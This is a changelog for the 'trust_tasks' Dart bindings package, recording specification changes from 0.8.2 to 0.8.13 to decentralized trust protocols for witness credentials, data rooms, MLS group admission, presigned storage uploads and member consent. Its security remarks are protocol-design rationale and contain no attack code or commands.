# Changelog — `trust_tasks`

All notable changes to the Dart bindings package.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
The package versions over **its own API** — what a consumer compiles against —
not over `SPEC.md`. Below 1.0 a breaking change bumps the leading non-zero
component.

Publishing is triggered by the `trust-tasks-dart-v<version>` tag, because
pub.dev only accepts an automated publish from a tag-triggered workflow. See
`RELEASING.md`.

## 0.8.13 — 2026-10-16


### Added

- **vta/witness**: List — read back stored witness credentials with their outcome evidence (#800)

vta/witness/accept stores a VWC with its outcome evidence (the
  witness/session document and the witness's submit #response), and its
  answer was the client's only copy of that evidence: vault/credentials/query
  returns body-free descriptors and vault/credentials/get the credential alone.
  A client that stopped between accept returning and recording the result, or
  another device of the same principal, could see the VWC and not present it,
  since a VWC without its evidence counts for nothing at a verifier.

  vta/witness/list/0.1 returns every stored VWC the caller may read, each as
  accept answered it (credentialId, witness, relationshipDid,
  vwcDigestMultibase) plus acceptedAt and the evidence byte for byte, the VWC
  travelling once inside evidence.outcome. Filters relationshipDid and witness
  (AND-combined); pageSize (<= 100) / cursor / truncated as vta/credentials/list.
  Only VWCs in contexts the caller may act in (witnessRequest, never sign alone),
  active vault entries only; an unreachable or unknown DID matches nothing,
  never an error. Lists VWCs accepted under 0.1 and 0.2 alike. A read:
  sideEffects none, discloses secret, so request and response proofs and
  issuedAt are REQUIRED; retention transient.

  accept/0.2's "Reading the evidence back later" and the 0.6 conventions now
  point at it. Bindings regenerated (Rust, TS, Go, Dart).

## 0.8.12 — 2026-10-16


### Added

- **vtc/members**: Registry-consent — a member grants or withdraws their own trust-registry consent (#798)


### Documentation

- **keys**: Sign-jws and sign-csr name their known implementation (#792)

keys/sign-jws/0.1 and keys/sign-csr/0.1 declared no knownImplementations,
  so the registry showed "Not declared" for both, although a runtime
  implementation exists: OpenVTC/verifiable-trust-infrastructure#2057 (VTA
  custodian; merged 2026-10-13 at dda501d) serves both tasks. Its test
  suite reproduces the sign-jws example's signing input and SHA-256 digest,
  and checks that a sign-csr request's signature verifies.

  Front matter only; no wire or binding change.



### Specifications

- **witness**: Add 0.2 — a member presentation on submit, and outcome evidence on personhood/assert, replace the ext stop-gaps (#799)

Two members implementations carried in a vendor extension,
  ext["org.openvtc.witness"], become specified members, so any witness and
  any community reads them.

  - witness/session/submit/0.2: optional memberPresentation — a VP by the
    member DID, for authentication, bound to the session's challenge and
    domain, carrying the eligibility credentials (a membership credential
    naming the member DID). Neither party nor the witness; a failure where
    relied on is presentationInvalid; a witness not using it MUST NOT treat it
    as satisfying anything. The member DID never appears in the VWC, and the
    witness keeps neither it nor the presentation. Privacy: links the pairwise
    relationship DID to the member DID at the witness; proves co-possession in
    one session, not one person; the alternatives are recorded.
  - witness/session/0.2: same payload; its outcomeEvidence names
    submit/0.2#response. The declaration belongs to the initiating document's
    specification (SPEC §7.3 item 20, §4.9.4 check 3), so a 0.1 session cannot
    close with a 0.2 submit. Versions pair one to one.
  - vtc/members/personhood/assert/0.2: optional outcomeEvidence (1–16
    entries, each {session, outcome} carried byte for byte). A VWC counts only
    from a trusted witness, paired by §4.9.4's four checks and the witnessing
    checks; unpaired entries are ignored. A member presents only the VWCs it
    selects.
  - witness/_shared/0.1/outcome-evidence: OutcomeEvidence, shared by
    personhood/assert/0.2 and vta/witness/accept/0.2.
  - vta/witness/{open,present,accept}/0.2 + vta/_shared/0.6 conventions:
    conduct 0.2 sessions; present puts the member presentation in
    memberPresentation; open drops memberLinkUnsupported; a 0.2 session is
    continued only by 0.2 tasks. The 0.1 tasks are unchanged.

  Bindings regenerated (Rust, TS, Go, Dart).

- **rooms/keys**: Act 0.3 — a member takes up a community's offer of a room as themself, with only a KeyPackage their key holder minted (#797)

`vtc/rooms/offers/list/0.1` and `vtc/rooms/offers/accept/0.1` must be signed
  as the DID the community addressed its offer to. That DID is the member as
  the community knows them — typically a persona their key holder holds — so
  no surface the member acts from can sign either, and `rooms/keys/act/0.2`
  could not complete them: its `type` pattern admits only `rooms/`, and its
  closed table lists neither. A member could be offered a room and never
  reach it.

  act 0.3:
  - The table gains `vtc/rooms/offers/list/0.1` and
    `vtc/rooms/offers/accept/0.1`, with no presentation inserted: the member
    holds no room authority yet, and the community checks the offer against
    the document's proof. The `type` pattern admits `vtc/rooms/offers/` beside
    `rooms/` and nothing else of the vtc family (new invalid example: an
    administrator's `vtc/rooms/community/members/add` is refused by schema).
  - Producer item 2: `issuer` REQUIRED for the offer types (the DID the offer
    is addressed to); `recipient` is the community.
  - Recipient item 2b (new): for the offer types, act as `issuer` iff the
    recipient holds a key `issuer`'s DID document lists for `authentication`
    and the caller may act as it; `issuerNotPrincipal` otherwise,
    `principalAmbiguous` when absent; never pick for the caller. No room
    credential is required.
  - Recipient item 10 / Producer item 5 (new): an acceptance's `keyPackage`
    is completed only when the recipient minted it with rooms/keys/key-package
    for that room and that member and still holds its private half (unused,
    unexpired), compared by KeyPackageRef, never by its leaf credential;
    otherwise the new code `keyPackageNotHeld`.
  - Security & Privacy: why item 10 is required — a KeyPackage the key holder
    did not mint becomes the member's leaf with keys someone else holds (the
    client), opening every later record and signing group messages as the
    member outside the key holder and beyond any withdrawal of the client's
    standing; the leaf credential is signed by the leaf key, not the member's
    DID, so the community cannot tell, and only the minting key holder can.
    And why the offer types belong in act rather than a task of their own:
    same entitlement, same delegate refusal (item 3), same closed table — one
    signing-as-the-member surface to audit, not two — and a key holder that
    accepted itself would call the community and route the answer, which item
    7 rules out.
  - Examples: an acceptance completed as the member; a `keyPackageNotHeld`
    refusal.

  vtc/rooms/offers/{list,accept}/0.1, in place: one paragraph each under
  Authorization pointing a surface without the member's keys at act 0.3.
  Prose only; their wire is unchanged (SPEC §5.2 editorial, as #783).

- **vtc/rooms/community/members/remove**: The answer says what removal did in its structured members, not in a notice — clarified in place (#796)

Item 4 required the community to "say in its record and its answer that
  removal does not recall what was read", but the response schema has no
  member to say it in (`additionalProperties: false`). An implementation
  could comply only through `ext`, which a caller cannot depend on — so the
  requirement promised callers something the wire never guaranteed.

  Two ways out: add an optional `notice` member, or drop "and its answer".
  This drops it, and puts the obligation where it does its work:

  - Community item 4: MUST NOT represent a removal, in its record or answer,
    as recalling what was read, re-sealing what was written, or revoking the
    authority credential. The answer's structured members are what it says:
    `member.state` `removed`, `member.validUntil` (when a host stops honouring
    the authority credential), and `epoch` (sealed tier, admitted member: the
    first epoch sealed without them; absent means nothing was withdrawn
    cryptographically — an open room, or a withdrawn offer).
  - Producer (new): the administrator's surface SHOULD show what removal does
    and does not do on the room's tier, and the member's `validUntil`, before
    the request is signed and before any step-up gesture bound to it; SHOULD
    report the answer from `validUntil`/`epoch`; MUST NOT report any removal
    as ending access to what was already read.
  - New subsection *Why the answer carries no notice*.

  Why not a field: the statement is identical for every removal on a tier, so
  it carries nothing the caller cannot render from the specification, the
  tier, `validUntil` and `epoch`; as a field it would be server-chosen,
  unlocalised prose shown to an administrator as guidance; and it would
  arrive after the decision. The moment it matters is before the requester
  commits, when a bound step-up ties them to this one document — which is a
  producer obligation, not a response member. An implementation MAY still
  carry a statement under `ext`; a caller MUST NOT depend on one.

- **rooms/owner/group**: Add 0.2 — a repeated admission is answered with its Welcome, not alreadyMember (#795)

`rooms/owner/group/add/0.1` item 6 settles a pending admission at the next
  request, which keeps the room and the owner's group in step across a lost
  host reply. But the next request is, in the case that matters, the same
  request again: the caller lost the answer and retries. 0.1 settled the
  pending admission, found `member` already in the group, and refused the
  retry `alreadyMember`. The Welcome — the only way the newcomer can join —
  was returned to nobody. The same happens when the recipient applied the
  admission and its own reply to its caller was lost. `vtc/rooms/offers/accept`
  already promises its callers that retrying is safe; under 0.1 it was not.

  add 0.2:
  - Item 8 (new): the recipient keeps, with the group state, the last
    admission it applied for the room — `member`, the KeyPackage's
    `KeyPackageRef` (RFC 9420 §5.2), epoch, Welcome and ratchet tree — until
    its next advance of the room or 24 hours, whichever comes first. A request
    naming the same room, the same `member` (string-equal) and a KeyPackage of
    the same `KeyPackageRef` is answered, once item 1 and the authorization
    checks pass, with that admission's epoch, Welcome and tree; the recipient
    does not advance the room, contact the host, change its group or build a
    fresh Welcome. Anything else for a member with a leaf is `alreadyMember`.
  - Item 6 hands over to item 8 when the pending admission it applies is the
    one the request repeats.
  - New section *Repeating an admission*: why re-serving is safe (the Welcome
    is HPKE-sealed to the KeyPackage's init key and addressed by its
    KeyPackageRef, RFC 9420 §12.4.3.1; the joiner discards the private half on
    use or expiry, so a late copy opens nothing), why the match is exact (equal
    KeyPackageRefs mean byte-identical KeyPackages, hence the same init key; a
    different KeyPackage for the same member would be a second leaf), and why
    retention is short.
  - `alreadyMember` and `hostUnreachable` meanings updated; retention and
    exposure rationales say what is kept. No code added; payload and response
    schemas unchanged.

  vtc/rooms/offers/accept/0.1, in place: "Repeating an accept" now points at
  group/add 0.2 items 6 and 8, says the community repeats its own request to
  its VTA unchanged, and that the community's VTA serves group/add at 0.2 or
  later. Prose only; its wire is unchanged, and it now describes what its own
  existing retry promise requires (SPEC §5.2 editorial, as #783).

- **vtc/vetting/vetters/pcs-root**: A member may recover a lost enrolment answer within the same label (#791)

pcs-root/0.1 refused every second enrolment under a label as
  alreadyEnrolled. That is right for counting, but it made a lost answer
  unrecoverable for the rest of the label: if the community issued and the
  answer never reached the vetter in a form it could open (late arrival, a
  client restart losing the blinding state, a transport drop), the vetter
  held no credential and was locked out of hidden vetting until the next
  vetter/<YYYY-MM> label. This happened in a live run.

  vtc/vetting/vetters/pcs-root/0.1 (draft, in place per SPEC §5.2), new
  "Recovering a lost answer" section under Authorization:
  - A community MAY answer a second request under a label the member is
    enrolled in with a fresh issuance over the new blinded request, when its
    `id` is the one recorded for the member. Every first-enrolment check still
    applies (live grant, proof, issuedAt, wrongLabel, badRequest).
  - It MUST NOT re-issue unless its suite binds the blinded request to the
    secret `id` is derived from, so every credential under one `id` yields
    the same tags. That binding is what stops a re-issue counting as a second
    vetter; without it the community refuses with alreadyEnrolled.
  - A different `id` is still identifierRebound. No second enrolment is
    recorded. Re-issues SHOULD be bounded per member per label, refused beyond
    the bound with alreadyEnrolled, and audited.
  - What this gives up is "exactly one credential object per member per
    label", not "each member counted once". Distinctness is by tag.
  - Client note: re-run vta/pcs/root-request for the label (it replaces the
    blinding state and keeps the key, so the `id`), send, and pass the answer
    to vta/pcs/root-accept. alreadyEnrolled now means the community does not
    re-issue, or no longer will for this label.

  The alreadyEnrolled meaning, the proof rationale and the "record only after
  signing" note say the same. hidden/publish/0.1's pointer to pcs-root no
  longer says a second enrolment is impossible. Bindings regenerated.

  The issue's alternative, an administrator task to clear an enrolment, is
  not taken: re-issuance under the same `id` recovers without an operator
  and without a record of the member's enrolment being erased.

- **vtc/join-requests**: Submit and supplement say why a hidden-vetting challenge was refused (#790)

A hidden-vetting proof is bound to a single-use challenge issued over
  vtc/vetting/pcs-challenge, and the community spends that challenge when it
  counts the proof. Neither vtc/join-requests/submit nor
  vtc/join-requests/supplement declared a code for a refused challenge, so
  implementations fell back to malformedRequest. An applicant could not tell
  an expired challenge from a spent one, or either from a client bug.

  submit/0.2, submit/0.3 and supplement/0.1 (draft, in place per SPEC §5.2)
  each declare four codes under the task's own name, none retryable:
  - challengeNotIssued: no challenge held for the applicant's DID;
  - challengeAlreadyUsed: spent by an earlier submission or supplement;
  - challengeExpired: past expiresAt, details MAY carry expiredAt (the
    details schema does not close the object, so an implementation's own
    markers still validate);
  - challengeMismatch: bound to a value other than the open challenge,
    which this attempt spends.

  A new "Hidden-vetting challenge" section in each says where the proof
  travels (extensions.hiddenVetting), that counting it spends the open
  challenge whether or not the applicant is then admitted, that the message
  never echoes the challenge value, that the value is discarded on use, and
  that a value-free spent marker MAY be kept until expiry so a repeat attempt
  is told challengeAlreadyUsed rather than challengeNotIssued. Recovery is a
  new challenge and a new proof. submit/0.3 adds that a producer SHOULD name
  its criterion on a hidden-vetting submission. supplement/0.1's
  `extensions` is no longer described as wholly uninterpreted, and
  pcs-challenge/0.1's Retention permits the spent marker and points at the
  codes.

  The issue's note about several hidden-vetting criteria spending one
  challenge is moot: vtc/vetting/hidden/publish refuses a second criterion
  (otherCriterion, #734). Bindings regenerated (Rust ERROR_CODES).

- **vtc/members/update**: PublishConsent may be withdrawn by an administrator, never granted — consentGrantForbidden (#789)

A member's consent to trust-registry publication is the member's own
  privacy decision, given with `registryConsent` on vtc/join-requests/submit.
  update/0.1 listed `publishConsent` among the fields an administrator may
  change with no direction, so an administrator could raise it and publish
  someone who said no.

  vtc/members/update/0.1 (draft, in place per SPEC §5.2):
  - `publishConsent` MAY lower consent (true -> false, e.g. a takedown) and
    MAY restate the current value. It MUST NOT raise it: consent becomes true
    only through the member's own registryConsent on a join submit, including
    a rejoin, which writes a fresh member record.
  - New error vtc/members/update:consentGrantForbidden (not retryable),
    checked after notFound and adminRoleForbidden. A refused raise rejects the
    whole update; no other field in the request is applied.
  - A withdrawal: the community SHOULD remove the member's published registry
    record at its next sync, and MUST NOT publish the member again until the
    member consents anew.
  - Security & Privacy says why consent runs one way. Bindings regenerated.

## 0.8.11 — 2026-10-16


### Specifications

- **rooms/keys**: Act 0.2 — the member is the subject, and a document that names no room names its member (#787)

`rooms/keys/act/0.1` declared `subjectPath: /document/payload/roomId` and
  resolved the member to act as "among the members of the document's room".
  Three types in its own table carry no `roomId` — `rooms/blobs/chunk/0.1`
  (`downloadId`, `index`) and `rooms/blobs/upload/{commit,abort}/0.2`
  (`uploadId`) — and for them 0.1 defined neither the subject nor how the
  recipient finds the document's room, while a producer MAY omit `issuer`.
  A conforming request could leave the recipient nothing to resolve the
  member from.

  act 0.2:
  - The table: these types carry no `roomId`; the member is the document's
    `issuer`, which the producer MUST set to the member whose request
    opened the transfer.
  - Producer item 2: `issuer` MUST be set for a type that names no room
    (MAY → MUST for those types; unchanged otherwise).
  - Recipient item 2a: for a type that names no room, act as `issuer` if it
    is a member the recipient holds keys for and the caller may act as;
    otherwise `issuerNotPrincipal`; `issuer` absent is `principalAmbiguous`.
    The recipient MUST NOT pick a member for the caller (not its only one,
    not one inferred from the transfer identifier).
  - `subjectPath` moves to `/document/issuer`. The subject is the party
    whose authority the task exercises (`actsAsSubject: true`) — the
    member, whose key signs — which is the question a delegated-execution
    policy point asks of `subjectPath` ("does the executing agent speak
    for this subject?") and exactly what Recipient item 2 decides. The room
    is the resource the completed document addresses, not a party the caller
    speaks for, and three of the table's types do not name one. Where
    `issuer` is absent (a room-naming type, one candidate member) the
    subject is the member item 2 resolves, and a recipient evaluating
    policy or audit against the subject MUST use it and MUST NOT treat the
    unresolved pointer as "no subject".
  - `principalAmbiguous` / `issuerNotPrincipal` meanings cover the
    room-less case. No code added; payload and response schemas unchanged
    except the `issuer` description.
  - Examples: a direct upload's commit completed as the member; a chunk
    refused `principalAmbiguous`. Invalid example: a non-DID `issuer`.

- **rooms/keys**: File-key and open 0.2 — unknownEpoch says `removed` when catching up cannot help (#786)

`rooms/keys/file-key/0.1` gave `unknownEpoch` two reasons in a closed
  details schema — `notDelivered` and `beyondChain` — and defined
  `notDelivered` as "E is later than any epoch it holds". A removal leaves
  the oracle's group where it was, so a file sealed after the oracle's
  principal was removed matches that definition too. The oracle could only
  say `notDelivered`, telling the caller to catch up with the room's
  commits, and no commit will ever make that epoch derivable for a removed
  member: a caller following the reason retried forever.
  `rooms/keys/open/0.1` declared `unknownEpoch` with no details schema at
  all, so a caller could not tell the two cases apart there either, and an
  implementation already sends an undeclared `reason: removed`.

  file-key 0.2:
  - `unknownEpoch.details.reason` gains `removed`, and `details` gains
    `removedAtEpoch` (integer, minimum 1).
  - Oracle item 4: `removed`, with `removedAtEpoch`, when a commit the
    oracle processed removed its principal from the room's group at
    `removedAtEpoch` and E is at or after it — no later commit will make E
    derivable, so the caller MUST NOT be told to catch up. It takes
    precedence: an oracle that knows of such a removal MUST NOT answer
    `notDelivered` for an E at or after it.
  - Caller: acts on `details.reason`, never on the message; after `removed`
    it MUST NOT retry after catching up.
  - A `removed` refusal example, a Security & Privacy sentence, and a
    "What changed from 0.1" section.

  open 0.2 declares the same three reasons and the same details schema for
  `rooms/keys/open:unknownEpoch`, with the same conformance text
  (`beyondChain` for an epoch earlier than the oracle's current one that its
  retained chain does not reach).

## 0.8.10 — 2026-10-16


### Added

- **vtc/members**: Admit and make-membership — direct admission by an administrator, decided by the community's admission policy (#784)

Two new draft tasks for admitting a member without a join request, as one
  governed ceremony:

  - vtc/members/admit/0.1 ("Add a member"): a DID with no access-control
    entry (or only an `application` entry) is admitted at a community role the
    administrator names. The community writes the entry, the member record and
    a revocation slot and issues the VMC and role VAC, as a completed join
    would. A former member (removed record, no entry) is re-admitted and
    reported `returning`.
  - vtc/members/make-membership/0.1 ("Make this a membership"): an existing
    live entry with no member record (typically the bootstrap administrator)
    gets the member record and credentials at the role it already holds; the
    entry itself is not changed.

  The rules no policy can change:
  - the requester holds `vtc.members.manage` (permissionDenied);
  - a role other than `member` takes `vtc.roles.assign`, and the entry it
    seats is bounded by the requester's own;
  - `admin`, `application` and any role conferring authority-conferring
    capabilities are never seated (`roleNotPermitted`);
  - make-membership refuses an `application` entry, an expired or suspended
    entry, a live membership and a removed record.

  The community's admission policy then admits, refers (parked in the action
  list, answered with trust-task-next-step, approved only by another holder of
  `vtc.members.manage` who is neither requester nor subject, every check
  re-run at execution, exactly once) or refuses (`deniedByPolicy`). Step-up
  and consent are described as the model the tasks are designed for, not
  required (SPEC §7.3 item 13).

  Both answer with the same AdmittedMembership (subject, role, label?,
  status, returning, approval policyAllowed|approved|waived,
  statusListIndex, vmc, roleVac), shared in vtc/_shared/0.1/admission.

  The wire shape and codes are those of the Verifiable Trust Infrastructure
  implementation (vtc-service), which bound the tasks ahead of this
  specification with local types; generated types replace them.

  Bindings regenerated (Rust, TS, Go, Dart).



### Specifications

- **external**: Credentials/issue 0.3 — details.maxOperations is a guaranteed-to-fit count, clarified in place (#783)

0.3 said `details.maxOperations` on `responseTooLarge` was "how many of the
  batch's operations, taken in order, would fit", which left open whether a
  consumer may rely on it or must treat it as a hint.

  It is a guarantee, and now says so:

  - Producer (Conformance item 7): a custodian that gives `maxOperations`
    MUST give a count k such that the same request, with `presign.requests`
    cut to its first k operations (and `uploadId` left out if none of them
    needs one, as item 4 requires), is answered within the bound on
    `sealedCredential`, the account and binding as they were at the refusal.
    It MAY be conservative — a sealed bundle's length varies with its
    ciphertext's randomness, so a count computed from an upper bound on the
    sealed length is sometimes lower than the most that would fit. It MUST
    NOT give a count it has not established fits; it omits the member when it
    cannot compute one or when not even one operation fits. The count speaks
    for those operations in that order only.
  - Consumer (item 5): SHOULD split by it (else in half); the first part fits,
    the rest carries no promise, and the consumer MUST handle another
    `responseTooLarge` on any part or any other batch by splitting again. It
    MUST NOT treat the count as a size that fits other operations. A single
    operation refused this way cannot be split and SHOULD NOT be retried.
  - The `responseTooLarge` meaning, the "What changed from 0.2" list and the
    refusal example say the same.

## 0.8.9 — 2026-10-15


### Specifications

- **external**: Credentials/issue 0.3 — at most 64 presigned requests per batch, responseTooLarge when the sealed answer would exceed its bound (#781)

0.2 let a presign batch hold 128 operations and bounded the response's
  sealedCredential at 262144 characters, on the estimate that 128 presigned
  requests are about 128 KiB of cleartext and a third more once armored.
  That estimate does not hold: a sealed-transfer bundle's overhead depends
  on how its cleartext is encoded inside the seal and can be several times
  the cleartext, and objectKey and uploadId may each be 1024 characters, so
  a long key or upload id lengthens every URL in the set. A batch of 128
  could produce an answer the schema forbids, and 0.2 said nothing about
  what a custodian does then.

  external/credentials/issue 0.3 (draft; a narrowed constraint, so a new
  MINOR per SPEC §5.2):
  - PresignBatch.requests maxItems 128 -> 64; every prose 128 for this task
    updated (summary, Direct uploads, Definitions, examples, Security).
  - New error external/credentials/issue:responseTooLarge: a custodian whose
    sealed answer to a valid batch would exceed the sealedCredential bound
    refuses it — never truncates the set, never answers over the bound —
    with optional details.maxOperations; the caller SHOULD split and ask
    again. It is a new conformance item 7, after the batch, ceiling and TTL
    checks and before the rate check; a refused batch does not count
    against the binding's rate. The custodian learns the size by presigning
    and sealing (no provider contact), so noKeyAgreement precedes it, and a
    set built and refused is discarded unreturned and unlogged.
  - The maxDocumentBytes rationale is corrected; sealedCredential stays at
    262144 and maxDocumentBytes at 65536 / 294912, which still hold a bundle
    at its bound plus the echoed batch, envelope and proof.

  Why cap rather than raise the bound: presigned requests are bearer
  authority until they expire (five minutes at most for direct-upload
  targets), so presigning more than can be used before expiry only widens
  exposure; 64 parts of S3's 5 MiB minimum is 320 MiB per batch, and larger
  uploads use larger parts or ask again; a larger answer must cross
  mediators, DIDComm envelopes whose nesting multiplies base64 expansion,
  and memory-constrained custodians and hosts.

  Invalid examples: a 65-operation batch (request) and a response echoing
  65 operations. external/_shared/0.1 already names PresignedRequestSet for
  "0.2 and later" and keeps its own 128 bound for 0.2, so it is unchanged.
  rooms/blobs/upload/begin/0.2's 128 part targets per answer stays true: a
  host fills such an answer with two issuances. Bindings regenerated.

## 0.8.8 — 2026-10-15


### Added

- **vta/witness**: The client carries the witness messages — vta/witness/{open,present,accept} replace vta/witness/request (#779)

vta/witness/request/0.1 (#777) had the VTA make both round trips to the
  witness itself, as the principal's relationship DID. It cannot: a witness
  checks that the transport-proven sender of each document is its issuer and
  replies to that sender, and the relationship DID's one mediator connection
  belongs to whoever holds the relationship, normally the client. So the
  client carries the messages and the VTA builds, signs and verifies, in
  three steps:

  - vta/witness/open/0.1: checks key custody, the credentials and the member
    link up front, opens a session record, and returns the witness/session
    document signed as relationshipDid for the client to send.
  - vta/witness/present/0.1: takes the witness's session #response verbatim,
    checks it is the witness's for this session, builds the relationship
    presentation (and the member presentation) bound to its challenge and
    domain, and returns the signed witness/session/submit document.
  - vta/witness/accept/0.1: takes the submit #response verbatim, verifies the
    VWC as #777 did, stores it with its evidence, and answers as #777 did.

  The record is keyed by the session id within the caller's contexts,
  expires, holds no presentation or challenge, and moves opened -> presented
  -> accepted. Every handed-back document is checked against it (type,
  issuer = the witness, recipient = relationshipDid, threadId, the witness's
  proof) before it is read, so nothing from another session can be spliced
  in. Each step is safe to repeat: open's duplicate is inert, present's
  duplicates are spent by the witness's single-use challenge, and accept
  answers the same outcome again without storing twice.

  Shared rules are in vta/_shared/0.5/CONVENTIONS.md and the shared shapes
  (SessionId, CarriedDocument) in witness-party.schema.json. The
  witnessRequest capability now covers the three tasks.

  vta/witness/request/0.1 is published (release #778), so it is not edited:
  it is retired in place, supersededBy vta/witness/open/0.1, with a status
  note naming its successors, why it cannot be implemented, and that no
  implementation shipped it.

## 0.8.7 — 2026-10-15


### Added

- **vta/witness**: Vta/witness/request — the VTA runs a witnessed session for its principal's relationship (#777)

A Verifiable Witness Credential is issued to the participating party of a
  witness/session, who presents its relationship credential bound to the
  session's challenge. A principal whose keys and credentials live in a VTA
  cannot do that from a client that holds neither. This adds
  vta/witness/request/0.1: the client names a witness, the relationship
  (relationshipDid, counterpartyDid, the enclosing thread) and credentials by
  vault handle; the VTA opens the session as the relationship DID, builds and
  signs the presentation itself, submits, verifies the VWC as a verifier of
  the evidence would (issuer = session recipient = response signer,
  taskContext/taskDigest over the session document as sent, subject and
  object digest, vwcDigestMultibase), and stores it in the credential vault
  with its evidence — the session document as sent and the submit #response
  as received. It answers with the vault handle, the digest and the two
  evidence documents (which carry the VWC); never a key, a presentation or
  the challenge.

  Membership evidence is optional. A VMC naming the relationship DID rides
  in the relationship presentation; one naming a member DID needs an
  explicit memberDid, and the VTA builds a second presentation by that DID
  bound to the same session. witness/session/submit/0.1 has no member for
  it, so its carriage is the witness's own (SPEC 4.5.1 leaves an ext
  namespace's semantics to its controller); the OpenVTC carriage is cited
  non-normatively.

  Authorization is standing over every context the task touches, expressed
  as the new witnessRequest capability (witness-request in device/_shared
  0.1), which is not sign and is not satisfied by sign. Errors: notFound,
  credentialMismatch, noMatchingProtocol, witnessUnreachable (retryable),
  witnessRefused, challengeMismatch, presentationInvalid (the witness's own
  code and message in details), vwcInvalid.

## 0.8.6 — 2026-10-15


### Specifications

- **external**: Credentials/issue 0.2 — batched presigned requests with signed length and checksum, multipart and head, for direct uploads (#775)

rooms/blobs/upload/begin/0.2 lets a host answer with direct-to-storage
  targets whose PUT binds each part's exact length and SHA-256 (item 17),
  and commit/0.2 has the host verify the object at storage and complete a
  multipart upload before recording (item 3). A host that holds no storage
  credential asks its custodian for each request through
  external/credentials/issue on an s3-static-presign account, and 0.1 can
  express none of it: one GET/PUT/DELETE per issuance, no signed headers,
  no multipart operations, no HEAD.

  external/credentials/issue 0.2:
  - the payload takes either `scope` (session and token models, as 0.1)
    or `presign` (s3-static-presign only): one object, at most one
    multipart upload of it, up to 128 operations — put, get, head, delete,
    create-multipart, upload-part, list-parts, complete-multipart,
    abort-multipart;
  - the custodian signs Content-Length and x-amz-checksum-sha256 into put
    and upload-part, uploadId/partNumber into the query,
    x-amz-checksum-algorithm into create-multipart, x-amz-mp-object-size
    into complete-multipart, x-amz-checksum-mode into head, so storage is
    the enforcer;
  - every operation is presigned, none performed: issuance keeps needing
    no egress, and verifying the object stays the host's duty;
  - the binding ceiling is unchanged: each operation is authorized by
    put / get / delete (multipart writes by put, head by get, abort by
    delete), so no account record or other task changes shape;
  - a batch counts once against the binding's rate;
  - new errors requestShapeMismatch and invalidBatch; the sealed cleartext
    for presign is a PresignedRequestSet; the response's bundle is bounded
    at 256 KiB, maxDocumentBytes declared.

  external/_shared/0.1 gains PresignOperation and PresignedRequestSet
  (additive); CONVENTIONS §6 names the new cleartext. Bindings regenerated.
  rooms/blobs/upload/{begin,commit}/0.2 do not name
  external/credentials/issue, so they are unchanged.

## 0.8.5 — 2026-10-15


### Added

- **rooms**: Rooms/owner/group/renew renews a sealed room; rooms/keys/act refuses a sealed room's mint (#773)

A sealed room (`attributed` / `private`) had no correct way to renew, and
  one way to brick itself that looked like a renewal.

  - rooms/epoch/mint advances a host without a commit (a host MUST), and on a
    sealed room the room epoch is the MLS group epoch + 1. rooms/keys/act/0.1
    completes a mint for a member's client, which holds no group key and so
    sends no commit: the host moves to N+1, every member's key holder stays at
    N, every write is refused as sealed under a superseded epoch, and the
    owner's next rooms/owner/group/{add,remove} fails epochConflict.
  - Only membership changes advanced a sealed room's epoch, so a room whose
    membership was stable lapsed after its epoch lifetime with no remedy.

  rooms/owner/group/renew/0.1 (new, Owner -> KeyHolder): the sibling of
  group/{create,add,remove}. The key holder advances the group with a commit
  that changes no membership (self-update or empty commit), builds the epoch
  link, retains the pending advance durably before sending (at most one per
  room, shared with add/remove), mints at the host with the commit, the link
  and the owner's admin presentation, applies only on acceptance, discards on
  refusal, keeps on an unknown outcome and settles via rooms/info. Errors:
  noGroup, noAuthority, epochConflict (details.hostEpoch), hostUnreachable,
  hostRefused.

  rooms/keys/act/0.1 (draft, edited in place): recipient item 9 refuses a
  rooms/epoch/mint for a room it holds group state for, for any member it
  serves, with the new rooms/keys/act:sealedRoomMint naming
  rooms/owner/group/renew; producer item 4 says not to ask. Open rooms keep
  renewing through act. The wire shape is unchanged; a draft MAY change
  without a version bump (SPEC §5.2/§5.3), and a 0.2 would leave 0.1
  permitting the defect it exists to close.

## 0.8.4 — 2026-10-15


### Added

- **rooms**: Act as the member's persona — rooms/keys/act, seal 0.2, direct-to-storage blob transfer (#771)

A member of a data room is the DID the room admitted — usually a persona
  their key holder (VTA) holds for them — but the member's own client (CLI,
  extension, phone) holds none of that DID's keys. Until now it could reach a
  host only through rooms/keys/present, which grants the leaf to the caller,
  and then signed with its own key: the host recorded the client's did:key as
  the actor and, on an attributed room, as the author of every record.

  - rooms/keys/act/0.1 (new): the client builds a host-bound room request
    without presentation or proof; the key holder completes it as the member
    (the member's own authority narrowed to the one action a closed table
    fixes per type, granted to the member; issuer = member; the member's
    authentication proof) and returns it for the client to send. Refused to
    delegates, which keep using rooms/keys/present.
  - rooms/keys/seal/0.2: optional signAsPrincipal — the key holder signs the
    SealedRecordBody as its author (a member the caller acts as) before
    sealing, so the record is attributed to the member.
  - rooms/blobs/upload/{begin,chunk,commit,abort}/0.2 and rooms/blobs/get/0.2:
    two transfer modes. Direct: the host authorizes and reserves as before,
    then issues per-part presigned PUTs (one object, one method, exact length
    and SHA-256 as signed headers, <= 5 min), verifies the object at storage
    before commit records it, and serves reads with a presigned GET. Proxied:
    bytes through the host as chunk documents signed by a single-use upload
    key the begin names, so file bytes never pass through the key holder.
    A host SHOULD NOT offer direct transfer on a private room unless its
    policy allows; the response always names the mode.
  - In place (drafts, wire unchanged): rooms/keys/{read,browse,backfill}
    present as the principal and never let the key holder's own identifier
    reach the host; rooms/keys/welcome and rooms/keys/open keep one group
    state per member per room.
  - rooms/_shared/0.1/blobs: TransferMode, PartPlan, TransferTarget (additive).

## 0.8.3 — 2026-10-14


### Documentation

- **vtc/rooms/community/members/remove**: Link rooms/owner/group/remove (#769)

#768 named the task in prose only, because it was not yet on main and the build
  refuses links to missing specifications. #767 has since merged.

## 0.8.2 — 2026-10-14


### Added

- **vtc**: Community-owned rooms and member offers — vtc/rooms/community/* and vtc/rooms/offers/* (#768)

A community hosts rooms its members own, and can now own rooms itself — the
  board's papers, a working group's drafts, a members' library — run from its
  console. Design: verifiable-trust-infrastructure docs/05-design-notes/
  data-rooms-files.md §8.4.

  The community is the owner, and its own VTA is the key holder: the VTA mints
  the room's DID, signs its credentials and holds the community's place in a
  sealed room's group, through the same rooms/owner/* and rooms/keys/* tasks any
  owner's key holder serves. The community holds no room key and no group
  secret.

  Administrators, holding the new vtc.rooms.manage (the owner's authority,
  distinct from hosting's vtc.rooms.admin):
  - vtc/rooms/community/create — the VTA mints, founds the group, issues the
    community's own admin authority; the room is stored only after every
    remote step, so a failure leaves no room behind.
